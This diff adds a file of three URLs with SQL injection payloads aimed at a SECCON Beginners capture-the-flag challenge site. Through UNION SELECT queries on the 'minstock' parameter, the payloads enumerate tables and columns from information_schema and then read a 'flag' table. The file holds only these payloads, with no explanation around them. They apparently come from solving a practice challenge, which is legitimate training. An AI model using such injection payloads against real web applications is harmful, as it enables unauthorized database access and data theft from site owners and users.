@@ -1,0 +1,5 @@
+http://goods.chall.beginners.seccon.jp/items.php?minstock=0%20UNION%20SELECT%201,1,1,1,table_name%20FROM%20information_schema.tables
+
+http://goods.chall.beginners.seccon.jp/items.php?minstock=0%20UNION%20SELECT%201,1,1,1,column_name%20FROM%20information_schema.columns%20WHERE%20table_name=%27flag%27
+
+http://goods.chall.beginners.seccon.jp/items.php?minstock=0%20UNION%20SELECT%201,1,1,1,flag%20FROM%20flag
